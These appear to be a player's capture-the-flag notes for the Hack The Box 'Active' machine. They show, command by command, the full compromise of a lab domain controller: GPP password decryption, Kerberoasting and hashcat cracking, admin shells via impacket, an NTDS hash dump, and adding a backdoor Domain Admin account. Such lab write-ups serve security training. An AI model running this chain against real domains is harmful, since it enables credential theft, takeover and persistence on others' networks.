1-Enummeration:
    └─$ nmap -sV -sC -Pn 10.129.26.87 -v
        

    
    DNS 53:
        dig any active.htb @10.129.26.87
        Nothiing too crazy

    RPC 135:
        rpcclient -U "" -N 10.129.26.87

        Enumeration RPC DOC: https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
        Error was NT_STATUS_ACCESS_DENIED

    389 / 636 LDAP:
        enum4linux -u "guest" -p "" 10.129.26.87

        └──╼ [★]$ cme ldap 10.129.26.87 -u guest -p ""
                    SMB         10.129.26.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
                    LDAP        10.129.26.87    389    DC               [-] active.htb\guest: STATUS_ACCOUNT_DISABLED


    SMB Enum 445:
        ──╼ [★]$ crackmapexec smb 10.129.26.87
                Default Test - pass

        └──╼ [★]$ crackmapexec smb 10.129.26.87 -u "" -p "" --shares
                    SMB         10.129.26.87    445    DC               [+] active.htb\: 
                    SMB         10.129.26.87    445    DC               [*] Enumerated shares
                    SMB         10.129.26.87    445    DC               Share           Permissions     Remark
                    SMB         10.129.26.87    445    DC               -----           -----------     ------
                    SMB         10.129.26.87    445    DC               ADMIN$                          Remote Admin
                    SMB         10.129.26.87    445    DC               C$                              Default share
                    SMB         10.129.26.87    445    DC               IPC$                            Remote IPC
                    SMB         10.129.26.87    445    DC               NETLOGON                        Logon server share
                    SMB         10.129.26.87    445    DC               Replication     READ        
                    SMB         10.129.26.87    445    DC               SYSVOL                          Logon server share
                    SMB         10.129.26.87    445    DC               Users                       

        └──╼ [★]$ crackmapexec smb 10.129.26.87 -u "" -p "" --users
                    SMB         10.129.26.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
                    SMB         10.129.26.87    445    DC               [+] active.htb\: 

        
        Lets dig into Replication:
                smbclient //10.129.26.87/Replication -N
                    NOthing special some files to investigate

        We found a Groups.xml file with:
            name="active.htb\SVC_TGS"
            cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"  BASE64 Hash file

        IT A GPP PASSWORD, coudl be cracked by command:
            Kali:
                gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

            if cmd not found:
                sudo apt update
                sudo apt install gpp-decrypt

            CLear Password:
                ┌─[us-dedivip-1]─[10.10.14.160]─[dsk75@htb-ytkqfwgihb]─[~]
                └──╼ [★]$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
                GPPstillStandingStrong2k18

        Creds to test: active.htb\SVC_TGS + GPPstillStandingStrong2k18

        Now we will test :
            └──╼ [★]$ crackmapexec smb 10.129.26.87  -u SVC_TGS -p 'GPPstillStandingStrong2k18'
                    SMB         10.129.26.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
                    SMB         10.129.26.87    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 


        Lets try to get SPNS:
            impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.26.87  -request
                ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
                --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
                active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-01-08 14:17:32.861752  

                $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$73375c995af9b1978eaa1e8d3a2ac07e$5c81b2b045df763704aa1e2547e7b33cfa03d5d521cfdd982415f3a9f2249cc28dec8c5494268bbaa6f9b195c7e99ec5b4ae545a0e862f239dbdc97553da86eaf813e21079255c604e86c575d338cf27fc98e841139f91951ccc6666414a32ea388a5a33947b4a3a2ccdebda9b1fb5fb3f95872ec7ad1cbea86f10f1b73e80f99b46520a89e6637cec702835e877bb939432d0381a94b4d535fc316a1d2b4e9685a7d279cfa002c5a975a6b2fd33278c652481ebeb31fc687f9ef5b770e39ac9ebf5b1ebc255eee044d1f99078afba7ec2fc1223b36213fb388fa823d3d81b962f0ce46633517a4ac68e8b7353962db008283ee1ea530c2ec7aa396ca68f426ee2d127840dc74d7ab73729e6d8846781efd1d9c363db0dd70b10982ab1a0117daaebb7d5a57f887b6ff2c0e2ee3d99d2d357acf8b82bd97875db9924664d3898e22da4be85c66ae980c9125d9fa2f035907d18990d939b146509c73a3b78be10a29e1efbca3f76a27e065577ddc6799cded468666c46dac303fa9fef0d0f77fa5f3ca999039992bdcaa38fee162ada3aa1fb93a6fb52e0618d081986fb3fc9c475b73a494d790d4b3f265be612bad0bc89ed289d91d9a4ce7a469c00f3bbcedeec9f8f6a1eaba17c8fc55f3f3a91409a1345f9be84829aa12d82c475b6c285933d0b88722d6c0097ba284370766fb3ec403ac6917c13178ec162092524d9e93edd4f73842f3e04dd24d934debab96809b9d071ce9b8fd841e4d39e5a077c544be5c3dc2c8b4dc78d8145d83ea84220a28662e5e8bab34d97b19b1fbafac112d15f53b71f0bf6058f56ffaa9cdc3c72f02eab052f5dfc2148cb5e71c8882c42d6007b5f63b532d1f68ec4ff3e16f17b2ab4995845fb22b735f8f06e82990df6c6f5246921d7b0f2a43a60287293da11a83d7dd49d980915cf4ed868440ef5b2a2612c404e4db9b653b5839ec7c633f32b4cd2ced6cc0afde7e183e31db2f74d91da05eec22fcaa931e54dd89962236c66faf02d983b8db9fa5d704fff7d97468b12771aa112f0609a3f91a0133fc2f78df45d46a8ca1b01aceb28faa4c491bd8f9b662b2aedfa96c61887d5fd37e8fb89f8173700c0506ad4069e0528f5bc78e82033773b6072b29b1e46c6009d7cf501e401bbc96e7c8ac1dc7129134a50458d6de4053f9a07bd26ca3f3d654256d0a3fec1b10e8679086ce200550596aea871a7681cb9672a68679356b228a87a2fdbbe91c098b291b92dbc06

        Impackethas automatically determined a valid Kerberoastable account and dumped its TGS. We will now extract the Password from this TGS offline using Hashcat

            hashcat -m 13100 '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$73375c995af9b1978eaa1e8d3a2ac07e$5c81b2b045df763704aa1e2547e7b33cfa03d5d521cfdd982415f3a9f2249cc28dec8c5494268bbaa6f9b195c7e99ec5b4ae545a0e862f239dbdc97553da86eaf813e21079255c604e86c575d338cf27fc98e841139f91951ccc6666414a32ea388a5a33947b4a3a2ccdebda9b1fb5fb3f95872ec7ad1cbea86f10f1b73e80f99b46520a89e6637cec702835e877bb939432d0381a94b4d535fc316a1d2b4e9685a7d279cfa002c5a975a6b2fd33278c652481ebeb31fc687f9ef5b770e39ac9ebf5b1ebc255eee044d1f99078afba7ec2fc1223b36213fb388fa823d3d81b962f0ce46633517a4ac68e8b7353962db008283ee1ea530c2ec7aa396ca68f426ee2d127840dc74d7ab73729e6d8846781efd1d9c363db0dd70b10982ab1a0117daaebb7d5a57f887b6ff2c0e2ee3d99d2d357acf8b82bd97875db9924664d3898e22da4be85c66ae980c9125d9fa2f035907d18990d939b146509c73a3b78be10a29e1efbca3f76a27e065577ddc6799cded468666c46dac303fa9fef0d0f77fa5f3ca999039992bdcaa38fee162ada3aa1fb93a6fb52e0618d081986fb3fc9c475b73a494d790d4b3f265be612bad0bc89ed289d91d9a4ce7a469c00f3bbcedeec9f8f6a1eaba17c8fc55f3f3a91409a1345f9be84829aa12d82c475b6c285933d0b88722d6c0097ba284370766fb3ec403ac6917c13178ec162092524d9e93edd4f73842f3e04dd24d934debab96809b9d071ce9b8fd841e4d39e5a077c544be5c3dc2c8b4dc78d8145d83ea84220a28662e5e8bab34d97b19b1fbafac112d15f53b71f0bf6058f56ffaa9cdc3c72f02eab052f5dfc2148cb5e71c8882c42d6007b5f63b532d1f68ec4ff3e16f17b2ab4995845fb22b735f8f06e82990df6c6f5246921d7b0f2a43a60287293da11a83d7dd49d980915cf4ed868440ef5b2a2612c404e4db9b653b5839ec7c633f32b4cd2ced6cc0afde7e183e31db2f74d91da05eec22fcaa931e54dd89962236c66faf02d983b8db9fa5d704fff7d97468b12771aa112f0609a3f91a0133fc2f78df45d46a8ca1b01aceb28faa4c491bd8f9b662b2aedfa96c61887d5fd37e8fb89f8173700c0506ad4069e0528f5bc78e82033773b6072b29b1e46c6009d7cf501e401bbc96e7c8ac1dc7129134a50458d6de4053f9a07bd26ca3f3d654256d0a3fec1b10e8679086ce200550596aea871a7681cb9672a68679356b228a87a2fdbbe91c098b291b92dbc06' /usr/share/wordlists/rockyou.txt --force


            Administrator - Ticketmaster1968


        Test if it Pawned:
            └──╼ [★]$ crackmapexec smb 10.129.26.87 -u Administrator -p 'Ticketmaster1968'
                    SMB         10.129.26.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
                    SMB         10.129.26.87    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
        
        Yeah

        Direct shell access on the DC (impact test)
            Option 1 – WMI (more discreet)
                impacket-wmiexec active.htb/Administrator:'Ticketmaster1968'@10.129.26.87

            Option 2 – PsExec (noisier but clearer)
                impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.26.87

        Proof:
            C:\>whoami /all
                USER INFORMATION
                ----------------

                User Name            SID                                         
                ==================== ============================================
                active\administrator S-1-5-21-405608879-3187717380-1996298813-500



        Complet Domain (NTDS) Dump:
            crackmapexec smb 10.129.26.87 -u Administrator -p 'Ticketmaster1968' --ntds
                MB         10.129.26.87    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
                SMB         10.129.26.87    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                SMB         10.129.26.87    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
                SMB         10.129.26.87    445    DC               active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
                SMB         10.129.26.87    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:68c2f73dcfed3e5c76429346efa3106e:::


    Persistency:
        Create Tempo Admin:
            crackmapexec smb 10.129.26.87 -u Administrator -p 'Ticketmaster1968' -x \ "net user pentest P@ssw0rd! /add /domain && net group \"Domain Admins\" pentest /add /domain"
                SMB         10.129.26.87    445    DC               [+] Executed command via wmiexec
                SMB         10.129.26.87    445    DC               The command completed successfully.


        Get the proof and connect with new user:
            impacket-wmiexec active.htb/pentest:'P@ssw0rd!'@10.129.26.87
                C:\>whoami /all
                    USER INFORMATION
                    ----------------

                    User Name      SID                                          
                    ============== =============================================
                    active\pentest S-1-5-21-405608879-3187717380-1996298813-1104
                    ACTIVE\Domain Admins                          Group            S-1-5-21-405608879-3187717380-1996298813-512 Mandatory group, Enabled by default, Enabled group             
                    ACTIVE\Denied RODC Password Replication Group Alias            S-1-5-21-405608879-3187717380-1996298813-572 Mandatory group, Enabled by default, Enabled group, Local Group

        Cherry on the Cake -> Clean UP:
            crackmapexec smb 10.129.26.87 -u Administrator -p 'Ticketmaster1968' -x \ "net user pentest /delete /domain"
